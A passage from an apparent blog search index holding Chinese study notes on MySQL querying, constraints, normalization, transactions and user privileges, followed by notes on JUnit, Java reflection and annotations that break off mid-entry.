子句后跟条件\n运算符\n\n&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt;\nBETWEEN…AND\nIN (集合)\nLIKE ‘张 %’ ：模糊查询\n\n_：单个任意字符\n%：多个任意字符\n\n\nIS NULL\nand 或 &amp;&amp;\nor 或 ||\nnot 或！\n\n\n\n-- 查询年龄大于20岁\nSELECT * FROM student WHERE age >= 20;\n-- 查询年龄等于20岁\nSELECT * FROM student WHERE age = 20;\n-- 查询年龄不等于20岁\nSELECT * FROM student WHERE age != 20;\nSELECT * FROM student WHERE age &lt;> 20;\n\n-- 查询年龄大于等于20，小于等于30\nSELECT * FROM student WHERE age >= 20 AND age &lt;= 30;\nSELECT * FROM student WHERE age BETWEEN 20 AND 30;\n-- 查询年龄22岁，19岁，25岁的信息\nSELECT * FROM student WHERE age = 22 OR age = 19 OR age = 25;\nSELECT * FROM student WHERE age IN (22,19,25);\n\n-- 查询英语成绩为null （null值不能使用=判断，只能用is null）\nSELECT * FROM student WHERE english IS NULL;\n-- 查询英语成绩不为null\nSELECT * FROM student WHERE english IS NOT NULL;\n\n-- 查询姓马的有哪些\nSELECT * FROM student WHERE NAME LIKE \"马%\";\n-- 查询第二个字是化的人\nSELECT * FROM student WHERE NAME LIKE \"_化%\";\n-- 查询姓名是三个字的人\nSELECT * FROM student WHERE NAME LIKE \"___\";\n-- 查询姓名中包含马的人\nSELECT * FROM student WHERE NAME LIKE \"%马%\";\n# 7.4 排序查询\n\n语法：order by 字句\n\norder by 排序字段 1 排序方式 1, 排序字段 2 排序方式 2 …;\n\n\n排序方式\n\nASC：升序，默认\nDESC：降序\n\n\n注意：\n\n如果有多个排序条件，则当前面的条件值一样时，才会判断第二条件\n\n\n\n-- 按照数学成绩排序\nSELECT * FROM student ORDER BY math ASC;\nSELECT * FROM student ORDER BY math DESC;\n-- 按照数学成绩排名，如果数学成绩一样，则按照英语成绩排名，都是升序\nSELECT * FROM student ORDER BY math ASC, english ASC;\n# 7.5 聚合函数\n\n将一列数据作为一个整体，进行纵向的计算。\n\ncount：计算个数\n\n一般选择非空的列：主键\ncount (*) —— 只要这一行数据有一个不为 null 就算作一个数据\n\n\nmax：计算最大值\nmin：计算最小值\nsum：计算和\navg：计算平均值\n\n\n注意：聚合函数的计算排除了 null 值\n\n解决方案：选择不包含空值的列进行计算，或使用 IFNULL 函数进行计算\n\n\n\n-- 查询学生的人数\nSELECT COUNT(NAME) FROM student;\nSELECT COUNT(IFNULL(english,0)) FROM student;\n-- 数学成绩的最大值和最小值\nSELECT MAX(math) FROM student;\nSELECT MIN(math) FROM student;\n-- 计算数学成绩的和\nSELECT SUM(math) FROM student;\n-- 计算数学成绩的平均值\nSELECT AVG(math) FROM student;\n# 7.6 分组查询\n\n基本语法：group by 分组字段\n注意：\n\n分组之后查询的字段：分组字段、聚合函数，写其他字段没有任何意义\nwhere 和 having 的区别：\n\nwhere 在分组之前进行限定，如果不满足这个条件则不参与分组。having 是在分组之后进行限定，如果不满足结果则不会被查询出来。\nwhere 后不可以跟聚合函数，having 可以进行聚合函数的判断\n\n\n\n\n\n-- 按照性别分组，分别查男女同学的平均分\nSELECT sex,AVG(math) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数\nSELECT sex,AVG(math),COUNT(id) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组,分组之后人数要大于两个人\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex HAVING COUNT(id)>2;\nSELECT sex,AVG(math),COUNT(id) 人数 FROM student WHERE math > 70 GROUP BY sex HAVING 人数>2;\n# 7.7 分页查询\n\n基本语法：limit 开始的索引，每页查询的条数；\n公式：* 开始的索引 = （当前页码 - 1）每页显示的条数\n分页操作是一个方言\n\n-- 每页显示3条记录 第一页\nSELECT * FROM student LIMIT 0,3;\n-- 每页显示3条记录 第二页\nSELECT * FROM student LIMIT 3,3;\n-- 每页显示3条记录 第三页\nSELECT * FROM student LIMIT 6,3;\n# 8、约束\n\n概念：对表中的数据进行限定，保证数据的正确性、有效性和完整性\n分类：\n\n主键约束：primary key\n非空约束：not null\n唯一约束：unique\n外键约束：foreign key\n\n\n\n# 8.1 非空约束\n\n\n非空约束：not null\n\n\n在创建表的时候添加非空约束\nCREATE TABLE stu (\n    id INT,\n    NAME VARCHAR(20) NOT NULL\n);\n-- 删除name列的非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40);\n\n\n创建完表后添加非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40) NOT NULL;\n\n\n\n\n# 8.2 唯一约束\n\n唯一约束：unique，某一列的值不能重复\n注意\n\n唯一约束可以有 null 值，但是只能有一条记录为 null\n\n\n\n\n在创建表的时候添加唯一约束\n\n-- 在创建表时添加唯一约束\nCREATE TABLE stu(\n\tid INT,\n\tphone_number VARCHAR(20) UNIQUE -- 手机号\n);\n\n创建完表后添加唯一约束\n\nALTER TABLE stu MODIFY phone_number VARCHAR(20) UNIQUE;\n\n删除唯一约束\n\nALTER TABLE stu DROP INDEX phone_number;\n# 8.3 主键约束\n\n主键：primary key\n注意\n\n含义：非空且唯一\n一张表中只能有一个主键，可以多个字段组成联合主键\n主键就是表中记录的唯一标识\n\n\n\n\n在创建表时添加主键\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY,\n\tNAME VARCHAR(20)\n);\n\n删除主键\n\nALTER TABLE stu DROP PRIMARY KEY;\n\n创建完表后添加主键\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY;\n# 8.4 主键约束 - 自动增长\n\n概念：如果某一列是数值类型的，使用 auto_increment 可以完成值的自动增长\n注意\n\n自动增长的值只和上一条的值有关\n自动增长一般会和主键联合使用\n也可以不和主键一起用，但是用的很少\n\n\n\n\n在创建表时添加主键，并完成主键自增长\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20)\n);\n\n删除自动增长\n\nALTER TABLE stu MODIFY id INT;\n-- 这样不会删除主键，但是可以删除自动增长\n\n创建表完成后添加自动增长\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY AUTO_INCREMENT;\n-- primaey key可加可不加\n# 8.5 外键约束\n\n外键约束：foreign key，让表与表产生关系，从而保证数据的正确性\n\n\n在创建表时添加外键\n\n\n\n\n\n\n\n\n\n\n语法：\ncreate table 表名 (\n​\t…\n​\t外键列\n​\tconstraint 外键名称 foreign key 外键列 references 主表名称 (主表列名称);\n)\nCREATE TABLE employee(\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20),\n\tage INT,\n\tdep_id INT, -- 外键对应主表的主键\n\tCONSTRAINT emp_dept_id FOREIGN KEY (dep_id) REFERENCES department(id)\n);\n\n删除外键\n\nALTER TABLE 表名 DROP FOREIGN KEY 外键名称;\nALTER TABLE employee DROP FOREIGN KEY emp_dept_id;\n\n在创建表之后添加外键\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明);\nALTER TABLE employee ADD CONSTRAINT emp_dep_id FOREIGN KEY (dep_id) REFERENCES department(id);\n# 8.6 外键约束 - 级联操作\n\n添加外键，设置级联更新\n\n概念：父表的主键在更新时，子表的外键值也跟着更新\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE;\n\n添加外键，设置级联删除\n\n概念：父表的主键在删除时，会自动删除子表外键中有该父表主键值的那一行数据\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON DELETE CASCADE;\n\n级联更新和删除可以在一行内一起使用，如\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE ON DELETE CASCADE;\n\n实际开发情况中级联的使用是非常谨慎的\n\n# 9、数据库的设计\n\n多表之间的关系\n数据库设计的范式\n\n# 9.1 多表之间的关系\n\n一对一（了解）：\n\n如：人和身份证\n分析：一个人只有一个身份证，一个身份证也只能对应一个人\n\n\n一对多（多对一）：\n\n如：部门和员工\n分析：一个部门有多个员工，一个员工只能对应一个部门\n\n\n多对多：\n\n如：学生和课程\n分析：一个学生可以选择很多课程，一个课程也可以被很多学生选择\n\n\n\n# 9.2 一对多表关系实现\n\n如：部门和员工\n\n\n\n实现方式：在多的地方去建立外键指向 1 的一方的主键\n在员工表里添加一个外键指向部门表的主键\n\n# 9.3 多对多表关系实现\n\n如：学生和课程\n\n\n\n实现方式：借助第三章中间表，中间表至少包含两个字段，分别指向两个表的主键\n两个字段要使用联合主键 ——foreign key (sid,cid);\n\n# 9.4 一对一表关系实现\n\n如：人和身份证\n\n\n\n实现方式：在任何一方添加唯一外键指向另一方的主键\n实际情况中一般会把两张表合成一张表\n\n# 10、范式\n\n概念：在设计数据库时需要遵循的规范。要遵循后边的范式要求，必须先遵循前边的所有范式要求\n分类：\n\n第一范式（1NF）：每一列都是不可分割的原子数据项\n第二范式（2NF）：在第一范式的基础上，非码属性必须完全依赖于候选码（在 1NF 基础上消除非主属性对主码的部分函数依赖 ）\n\n几个概念\n\n函数依赖：A-----&gt;B，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，则称 B 依赖于 A\n完全函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定需要 A 中所有的属性值\n部分函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定只需要依赖于 A 属性组中某一些值即可\n传递函数依赖：A-----&gt;B，B-----&gt;C，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，再通过 B 属性（属性组）的值可以确定唯一 C 属性的值，则称 C 传递函数依赖于 A\n码：如果在一张表中，一个属性或属性组被其他所有属性所完全依赖，则称这个属性（属性组）为该表的码\n主属性：码属性组中的所有属性\n非主属性：除去码属性组的属性\n\n\n\n\n第三范式（3NF）：在 2NF 的基础上，任何非主属性不依赖于其他非主属性（在 2NF 基础上消除传递依赖）\n\n\n\n# 11、数据库的备份和还原\n# 11.1 命令行\n备份：\nmysqldump -u用户名 -p密码 数据库名 > 保存的路径\n还原：\n1. 登录数据库\n2. 创建数据库\n3. 使用数据库\n4. 执行文件，source 文件路径\n# 11.2 图形化工具\n\n根据使用的工具进行导出和导入\n\n# 12、多表查询\n\n笛卡尔积：由两个集合 A,B，取这两个集合的所有组成情况\n要完成多表查询，需要消除无用的数据\n多表查询分类\n\n内连接查询\n外连接查询\n子查询\n\n\n\n# 12.1 多表查询 - 内连接\n\n内连接查询两张表中同时存在的数据，如果某一表的条件语句的字段为空，则这个结果不在结果表中显示\n\n\n隐式内连接：使用 where 条件来消除无用的数据\n\n-- 查询所有员工信息和对应部门信息,一般查询的时候会查询部分字段，不会将所有字段都查出来\nSELECT * FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称\nSELECT emp.name,emp.gende,dept.name FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称，使用表的别名\nSELECT t1.name,t1.gende,t2.`name` FROM emp t1,dept t2 where t1.dept_id = t2.id;\n\n显式内连接：\n\n语法：select 字段列表 from 表名 1 inner join 表名 2 on 条件；\n\n\n\nSELECT * FROM emp INNER JOIN dept ON emp.dept_id = dept.id;\nSELECT * FROM emp JOIN dept ON emp.dept_id = dept.id;\n\n\n内连接查询注意事项：\n\n从哪些表中查询数据\n查询条件是什么\n查询哪些字段\n\n\n\n# 12.2 多表查询 - 外连接\n\n左外连接\n\n语法：select 字段列表 from 表 1 left [outer] join 表 2 on 条件；\n查询的是左表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 LEFT JOIN dept t2 ON t1.dept_id = t2.id;\n\n\n右外连接\n\n语法：select 字段列表 from 表 1 right [outer] join 表 2 on 条件；\n查询的是右表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 RIGHT JOIN dept t2 ON t1.dept_id = t2.id;\n\n# 12.3 多表查询 - 子查询\n\n概念：查询中嵌套查询，称嵌套的查询为子查询\n基本演示\n\n-- 查询工资最高的员工信息\n-- 1.查询最高的工资是多少 9000\nSELECT MAX(salary) FROM emp;\n-- 2.查询员工信息，并且工资等于9000的\nSELECT * FROM emp WHERE salary = 9000;\n-- 一条SQL完成查询，子查询\nSELECT * FROM emp WHERE emp.salary = (SELECT MAX(salary) FROM emp);\n\n\n子查询的不同情况\n\n子查询的结果是单行单列的\n\n子查询可以作为条件，使用运算符去判断。运算符：&gt; &lt; &gt;= &lt;= &lt;&gt; =\n查询工资小于平均工资的人\nSELECT * FROM emp WHERE salary &lt; (SELECT AVG(salary) FROM emp);\n\n\n子查询的结果是多行单列的\n\n子查询可以作为条件，使用运算符 IN 来判断\n\n\n\n-- 查询`财务部`和`市场部`所有员工的信息\nSELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\";\nSELECT * FROM emp WHERE dept_id = 3 OR dept_id = 2;\nSELECT * FROM emp WHERE dept_id IN (2,3);\n\nSELECT * FROM emp WHERE dept_id IN (SELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\");\n\n子查询的结果是多行多列的\n\n子查询可以作为一张虚拟表来进行表的查询\n\n\n\nSELECT * FROM dept t1, (SELECT * FROM emp WHERE emp.join_date > '2011-11-11') t2 WHERE t1.id = t2.dept_id;\n-- 使用普通内连接查询\nSELECT * FROM emp t1, dept t2 WHERE t1.dept_id = t2.id AND t1.join_date > '2011-11-11';\n\n\n\n# 13、事务\n\n事务的基本介绍\n事务的四大特征 **（常见面试题）**\n事务的隔离级别（了解）\n\n# 13.1 事务的基本介绍\n\n概念：如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败\n\n\n\n\n操作：\n\n开启事务：start transaction\n回滚：rollback\n提交：commit\n\n\n\nMySQL 数据库中事务默认自动提交，Oracle 数据库默认是手动提交事务\n\n事务提交的两种方式：\n\n自动提交：\n\nmysql 就是自动提交的\n一条 DML（增删改）语句会自动提交一次事务\n\n\n手动提交：\n\n需要先开启事务，再提交\n\n\n\n\n修改事务的默认提交方式\n\n\n\n-- 查看事务的默认提交方式\nselect @@autocommmit; #结果为1表示自动提交，结果为0表示手动提交\n-- 修改默认提交方式\nset @@autocommit = 0;\n#这时候写了DML语句，不手动提交是不会生效的\n# 13.2 事务的四大特征 ***\n\n原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败\n持久型：当事务提交或回滚后，数据库会持久化地保存数据\n隔离性：多个事务之间相互独立\n一致性：事务操作前后数据总量不变\n\n# 13.3 事务的隔离级别\n\n\n概念：多个事务之间是隔离的，相互独立的，但是如果多个事务操作同一批数据，则会引发问题，设置不同的隔离级别就可以解决这些问题。\n\n\n存在的问题：\n\n脏读：一个事务，读取到另一个事务中没有提交的数据\n不可重复度（虚读）：在同一个事务中两次读取到的数据不一样\n幻读：一个事务操作（DML）数据表中所有的记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改\n\n\n\n隔离级别：\n\nread uncommitted：读未提交\n\n会产生的问题：脏读、不可重复度、幻读\n\n\nread committed：读已提交（Oracle 默认隔离级别）\n\n会产生的问题：不可重复度、幻读\n\n\nrepeatable read：可重复度（MySQL 中默认隔离级别）\n\n会产生的问题：幻读\n\n\nserializable：串行化\n\n可以解决所有的问题\n\n\n\n\n\n注意：隔离级别从小到大，安全性越来越高，但是效率越来越低\n\n\n数据隔离级别查询和设置\n\n\n-- 查询隔离级别：\nselect @@tx_isolation;\n-- 设置隔离级别：\nset global transaction isolation level 级别字符串; #字符串就是上面的4个\n# 14、DCL：管理用户，授权\n\nDBA：数据库管理员\n\n管理用户\n授权\n\n\n\n# 14.1 用户管理\n\n添加用户\n删除用户\n修改用户密码\n\nMySQL 中忘记 root 密码\n\n以 CMD 执行 net stop mysql 停止 mysql 服务（管理员权限）\n使用无验证方式启动 MySQL 服务：mysqld --skip-grant-tables\n打开新的 cmd 窗口，直接输入 mysql 命令回车就可以登录成功\nuse mysql;\nupdate user set password = password (‘新密码’) where user = ‘root’;\n关闭这两个窗口\n打开任务管理器，手动结束 mysqld.exe 进程\n使用新密码登录\n\n\n\n\n查询用户\n\n通配符 %：表示可以在任意主机使用用户登录数据库\n\n\n\n-- 切换到mysql数据库\nUSE mysql;\n-- 查询user表\nSELECT * FROM USER;\n\n-- 创建用户\ncreate user '用户名'@'主机名' identified by '密码';\nCREATE USER 'zhangsan'@'localhost' IDENTIFIED BY '123';\n\n-- 删除用户\nDROP USER '用户名'@'主机名';\nDROP USER 'zhangsan'@'localhost';\n\n-- 修改用户密码\nUPDATE USER SET PASSWORD = PASSWORD('新密码') WHERE user = '用户名';\nSET PASSWORD FOR '用户名'@'主机名' = PASSWORD('新密码');\n# 14.2 权限管理\n\n查询权限\n授予权限\n撤销权限\n\n-- 查询权限\nSHOW GRANTS FOR '用户名'@'主机名';\nSHOW GRANTS FOR 'zhangsan'@'localhost';\n\n-- 授予权限\nGRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名';\nGRANT SELECT ON db3.dept TO 'zhangsan'@'localhost';\nGRANT ALL ON *.* TO 'zhangsan'@'localhost';#将所有表的所有权限授予zhangsan\n\n-- 撤销权限\nREVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';\nREVOKE UPDATE ON DB3.ACCOUNT FROM 'LISI'@'%';\n","slug":"JavaWeb-数据库","date":"2022-06-20T15:09:13.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"7ee1f34768cc2e04e0232a752344cda0","title":"junit、反射","content":"# 1、junit 单元测试\n# 1.1 测试分类：\n\n黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码\n白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码\n\njunit 就是白盒测试的一种\n# 1.2 junit 的使用\n\n\n步骤\n\n定义一个测试类（测试用例）\n\n建议：\n\n测试类名：被测试类名 Test，如 CalculatorTest\n包名：xxx.xxx.xx.test，如 cn.itclass.test\n\n\n\n\n定义测试方法：可以独立运行\n\n建议：\n\n方法名：test 测试方法名，如 testAdd ()\n返回值：void\n参数列表：空参\n\n\n\n\n给这个方法加 @Test\n导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 org.testng.annotations.Test; ，但是能用\n\n运行成功后会显示绿色 Test passed\n使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功\n\n\n\n\n\n判定结果\n\n红色：失败\n绿色：成功\n可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色\n\nAssert：静态类，使用 Assert.assertEquals (期望值，真实值)\n判定结果的时候一般不进行输出\n\n\n\n\n\n可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行\n\n\npackage cn.itclass.test;\n\nimport cn.itclass.junit.caculater;\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.testng.Assert;\n\n\n\npublic class CalculatorTest &#123;\n    @Before\n    public void init() &#123;\n            System.out.println(\"before\");\n    &#125;\n    /**\n     * 测试add方法\n     */\n    @Test\n    public void testAdd()&#123;\n        System.out.println(\"我被执行了\");\n        //1.创建计算器对象\n        caculater a = new caculater();\n        int sum = a.add(1, 2);\n        //2.调用add方法\n        System.out.println(sum);\n        //3.断言：我断言的结果是3，如果是一样的就是\n        Assert.assertEquals(3,sum);\n    &#125;\n\n    @After\n    public void finish() &#123;\n        System.out.println(\"结束了\");\n    &#125;\n&#125;\n\n补充\n\n@Before：\n\n修饰的方法会在测试方法之前被自动执行\n\n\n@After：\n\n修饰的方法会在测试方法执行之后被自动执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n注：导包的时候一定要使用 org.junit ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能\n# 2、反射：框架设计的灵魂\n\n\n框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码\n\n\n反射：将类的各个组成部分封装为其他对象，这个过程称为反射机制\n\n\njava 代码在计算机中运行的三个阶段：\n\n\nSource 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法\n\n\nClass 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个 Class 类对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成 Field 对象，构造方法封装为 Constructor 对象，成员方法封装为 Method 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下\n\nField [] fields\nConstructor[] cons\nMethod[] methods\n\n这些组成一个类对象，之后可以使用这些类对象进行实例化等\n\n\nRuntime 运行阶段：Person 对象 new Person ();\n\n\n\n\n好处：\n\n可以在程序运行过程中去操作这些对象。\n可以解耦，提高程序的可扩展性\n\n\n\n\n# 2.1 获取 Class 类对象的方式\n\nClass.forName (“全类名”)：是将字节码文件加载进内存，返回 Class 对象\n\n多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类\n\n\n类名.class：通过类名的属性 class 来获取\n\n多用于参数的传递\n\n\n对象.getClass ()：getClass () 方法在 Object 类中定义着\n\n多用于对象的获取字节码的方式，有对象了想获取字节码文件对象\n\n\n\n\n结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport cn.itclass.domain.Student;\n\npublic class ReflectDemo1 &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        //1.Class.forName(\"全类名\")\n        Class cls1 = Class.forName(\"cn.itclass.domain.Person\");\n        System.out.println(cls1);\n        //2.类名.class\n        Class cls2 = Person.class;\n        System.out.println(cls2);\n        //3.对象.getClass()\n        Person p = new Person();\n        Class cls3 = p.getClass();\n        System.out.println(cls3);\n\n        //==比较这三个对象\n        System.out.println(cls1 == cls2); //true\n        System.out.println(cls1 == cls3); //true\n\n        Class cls4 = Student.class;\n        System.out.println(cls1 == cls4); //false\n    &#125;\n&#125;\n# 2.2 Class 对象功能\n\n获取功能：\n\n获取成员变量们\n\nField [] getFields ()：获取所有 public 修饰的成员变量\nField getField (String name)：获取指定名称的 public 修饰的成员变量\nField [] getDeclaredFields ()：获取所有成员变量，不考虑访问修饰符\nField getDeclaredField (String name)：获取指定名称的成员变量，不考虑访问修饰符\n\n\n获取构造方法们\n\nConstructer&lt;?&gt;[] getConstructors ()：获取所有 public 修饰的构造方法\nConstructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象\nConstructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，不考虑访问修饰符\nConstructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，不考虑访问修饰符\n\n\n获取成员方法们\n\nMethod [] getMethods ()：获取所有 public 修饰的方法\nMethod getMethod ()：获取指定 public 方法，参数为方法名和参数列表\nMethod [] getDeclaredMethods ()：获取所有方法，不考虑访问修饰符\nMethod getDeclaredMethod ()：获取指定方法，不考虑访问修饰符，参数为方法名和参数列表\n\n\n获取类名\n\nString getName()\n\n\n\n\nField：成员变量\n\n操作：\n\n设置值\n\nset (Object obj, Object value)：给 obj 对象设置 value 值\n\n\n获取值\n\nget (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值\n\n\n忽略访问权限修饰符的安全检查\n\nsetAccessible (true)：暴力反射，Field 对象中的方法\n\n\n\n\n\n\nConstructor：构造方法\n\n创建对象：T newInstance (Object … initargs)\n如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance\n\n\nMethod：方法\n\n执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表\n获取方法名称：\n\nString getName：获取方法名\n\n\n\n\n获取类名\n\nClass 对象.getName; 获取的是全类名\n\n\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport java.lang.reflect.Field;\n\n/*获取成员变量*/\npublic class ReflectDemo2 &#123;\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException &#123;\n        //0.获取person的class对象\n        Class&lt;Person> personClass = Person.class;\n        //1.Field[] getFields()\n        Field[] fields = personClass.getFields();\n        for (Field field:fields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //2.Field getField(String name)\n        Field a = personClass.getField(\"a\");\n        System.out.println(a);\n        //获取成员变量a的值\n        Person p = new Person();\n        Object value = a.get(p);\n        System.out.println(value);\n        a.set(p,\"张三\");\n        System.out.println(p);\n        System.out.println(\"===============================\");\n\n        //3.Field[] getDeclaredFields()\n        Field[] declaredFields = personClass.getDeclaredFields();\n        for(Field field : declaredFields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //4.Field getDeclaredField(String name)\n        Field d = personClass.getDeclaredField(\"d\");\n        //忽略访问权限修饰符的安全检查\n        d.setAccessible(true);//暴力反射\n        Object o = d.get(p);\n        System.out.println(o);\n    &#125;\n\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n/*获取构造方法*/\npublic class ReflectDemo3 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;\n        //0.获取Person的Class对象\n        Class personClass = Person.class;\n        //1.Constructer&lt;?>[] getConstructors()\n        Constructor[] constructors = personClass.getConstructors();\n        //2.Constructer\\&lt;T\\> getConstructor(类&lt;?>... parameterTypes)\n        Constructor constructor = personClass.getConstructor(String.class, int.class);\n        System.out.println(constructor);\n        //创建对象\n        Object person = constructor.newInstance(\"张三\", 23);\n        System.out.println(person);\n        Constructor constructor1 = personClass.getConstructor();\n        Object person2 = constructor1.newInstance();\n        System.out.println(person2);\n        //空参构造（已过时）\n        Object o = personClass.newInstance();\n        System.out.println(o);\n\n    &#125;\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class ReflectDemo4 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;\n        Class&lt;Person> personClass = Person.class;\n        /**\n         获取成员方法们\n\n         1. 获取所有方法：Method[] getMethods()\n         2. 获取指定方法：Method getMethod()\n         3. Method[] getDeclaredMethods()\n         4. Method getDeclaredMethod()\n         */\n        //获取指定名称的方法\n        Method eat = personClass.getMethod(\"eat\");\n        Person p = new Person();\n        eat.invoke(p);\n\n        Method eat1 = personClass.getMethod(\"eat\", String.class);\n        eat1.invoke(p,\"hello\");\n\n        //获取所有方法\n        Method[] methods = personClass.getMethods();\n        for(Method m : methods) &#123;\n            System.out.println(m);\n            m.setAccessible(true);\n            String name = m.getName();\n            System.out.println(name);\n        &#125;\n\n        String name = personClass.getName();\n        System.out.println(name);\n    &#125;\n&#125;\n\n# 2.3 反射案例\n\n需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法\n\n实现：\n\n配置文件\n反射\n\n\n步骤：\n\n将需要创建的对象的全类名和需要执行的方法定义在配置文件中\n在程序中加载读取配置文件\n使用反射技术来加载类文件进内存\n创建对象\n执行方法\n\n\n\n\n\npackage cn.itclass.reflect;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\n/**\n * 假设的框架类\n */\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n//        Person p = new Person();\n//        p.eat();\n\n        //1.加载配置文件\n        //1.1创建Properties对象\n        Properties pro = new Properties();\n        //1.2加载配置文件，转换为一个集合\n        //1.2.1获取ckass目录下的配置文件\n        ClassLoader classLoader = ReflectTest.class.getClassLoader();\n        InputStream is = classLoader.getResourceAsStream(\"pro.properties\");\n        pro.load(is);\n\n        //2.获取配置文件中定义的数据\n        String className = pro.getProperty(\"className\");\n        String methodName = pro.getProperty(\"methodName\");\n\n        //3.加载该类进内存\n        Class&lt;?> cls = Class.forName(className);\n\n        //4.创建对象\n        Object o = cls.newInstance();\n\n        //5.获取方法对象\n        Method method = cls.getMethod(methodName);\n\n        //6.执行方法\n        method.invoke(o);\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n注：类加载器没学，回头补上\n# 3、注解\n\n概念：说明程序的，给计算机看的\n注释：用文字描述程序的。给程序员看的\n概念描述：\n\nJDK1.5 之后的新特性\n说明程序的\n使用注解：@注解名称\n\n\n作用分类：\n\n编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】\n代码分析：通过代码里标识的注解对代码进行分析【使用反射】—— 经常使用\n编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】\n\n\n\n# 3.1 JDK 